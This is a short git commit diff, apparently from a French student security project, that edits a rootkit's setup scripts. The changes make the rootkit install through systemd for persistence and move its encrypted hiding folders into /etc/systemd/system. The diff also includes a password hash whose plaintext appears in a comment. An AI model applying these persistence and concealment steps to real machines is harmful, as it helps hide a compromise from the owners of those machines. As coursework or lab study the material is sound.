6d36a5cad9dbde099cf14367da13947b2c6712d4
samo <samuel.adoni-willybiro@epita.fr>
2025-06-15 00:03:08 +0200

    MODIFIE MASQUER

--- VICTIME/configuration_rootkit.sh
+++ VICTIME/configuration_rootkit.sh
@@ -7,6 +7,6 @@ echo "Lancement de l'encodage du script"
 sudo bash encodage.sh init &&
 
 echo "Lancer le makefile du rootkit"
-cd rootkit && make all && make install && make install-libhide &&
+cd rootkit && make all && sudo bash install.sh && make compile-and-run-in-systemd &&
 
 exit 0
--- VICTIME/encodage.sh
+++ VICTIME/encodage.sh
@@ -10,8 +10,8 @@ echo "=============================================="
 
 # Variables
 REPERTOIRE_COURANT=$(pwd)
-DOSSIER_CHIFFRE="$REPERTOIRE_COURANT/rootkit/dos_chiffre"
-DOSSIER_MONTE="$REPERTOIRE_COURANT/rootkit/dos"
+DOSSIER_CHIFFRE="/etc/systemd/system/dos_chiffre"
+DOSSIER_MONTE="/etc/systemd/system/dos"
 # Hash SHA-256 de référence (correspondant à "crystal2")
 HASH_REFERENCE="dc08160901551a78c7e63598654103d8e808579a175203161be05933f0d8376a"
 
